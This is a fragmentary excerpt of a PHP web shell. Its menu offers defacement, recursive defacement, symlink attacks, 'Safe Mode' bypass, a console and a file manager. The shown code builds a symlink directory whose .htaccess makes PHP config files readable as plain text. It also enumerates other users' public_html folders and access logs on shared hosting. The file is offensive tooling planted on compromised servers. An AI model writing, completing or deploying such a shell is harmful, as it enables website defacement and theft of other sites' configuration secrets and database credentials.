...
if (isset($_POST['p1']) && 'deface' == $_POST['p1']) {
...
<input type=hidden name=charset value="' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '">
    ...
    $m = ['Import Scripts' => 'ImportScripts', 'Jumping' => 'Jumping', 'Symlink' => 'Symlink', 'Domains' => 'Domain', 'Shared Hostings' => 'Shared', 'Sym Sites' => 'Sym', 'Subdomain' => 'Subdomain', 'Sec. Info' => 'SecInfo', 'Files' => 'FilesMan', 'Console' => 'Console', 'Safe Mode' => 'Bypass', 'String tools' => 'StringTools', 'Defacer' => 'Deface', 'Recursive Defacer' => 'Defacer'];
...
break;
default:
if (!empty($_POST['p1']) && (('copy' == $_POST['p1']) || ('move' == $_POST['p1']))) {
...
<form name=files method=post>';
 ...
 'group' => $gr['name'] ? $gr['name'] : @filegroup($dirContent[$i]),
    ...
    $l = 0;
    foreach ($files as $f) {
        echo '<tr' . ($l ? ' class=l1' : '') . '><td><input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx></td><td><a href=# onclick="' . (('file' == $f['type']) ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'view\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['path'] . '\');"><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>') . '</a></td><td>' . (('file' == $f['type']) ? viewSize($f['size']) : $f['type']) . '</td><td>' . $f['modify'] . '</td><td>' . $f['owner'] . '/' . $f['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'chmod\')">' . $f['perms']
. '</td><td><a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'touch\')">T</a>' . (('file' == $f['type']) ? ' <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'download\')">D</a>' : '') . '</td></tr>';
        $l = $l ? 0 : 1;
    }
...
function actionShared()
{
    ...
    foreach ($domains as $domain) {
        ...
        if (false !== strpos($array, "$lol")) {
            $shared = str_replace([" $lol"], '', $array);
            echo "<center>$shared";
        }
    }
...
[ <a href="#" onclick="g(\'symlink\',null,\'config\',null)">Config files symlink</a> ]</h3></center>';
    if (isset($_POST['p1']) && 'website' == $_POST['p1']) {
        echo '<center>';
    ...
    if (isset($_POST['p1']) && 'whole' == $_POST['p1']) {
        echo '<center>';
...
<td><a href='PCAPuNkHoLic_sym/root" . $passwd[$r] . "/public_html' target='_blank'>symlink</a></td></tr>";
    ...
    if (isset($_POST['p1']) && 'config' == $_POST['p1']) {
        echo '<center>';
        @mkdir('PCAPuNkHoLic_sym', 0777);
        $hdt = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \nAddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
        $hfp = @fopen('PCAPuNkHoLic_sym/.htaccess', 'w');
 ...
 function actionJumping()
 {
     ...
     ($sm = 0 == ini_get('safe_mode')) ? $sm = 'off' : die('<font size="4" color="#000000" face="Calibri"><b>Error: Safe_mode = On</b></font>');
     set_time_limit(0);
     ...
     foreach ($users as $user) {
         echo "<font color=#a3e956> [+] /home/$user/public_html/</font><br/>";
     }
...
function actionSubdomain()
{
    ...
    $scan = array_diff(scandir('/home/' . $user . '/access-logs/'), ['.']);
    $domains = implode('
http://', $scan);
    echo '
<style>
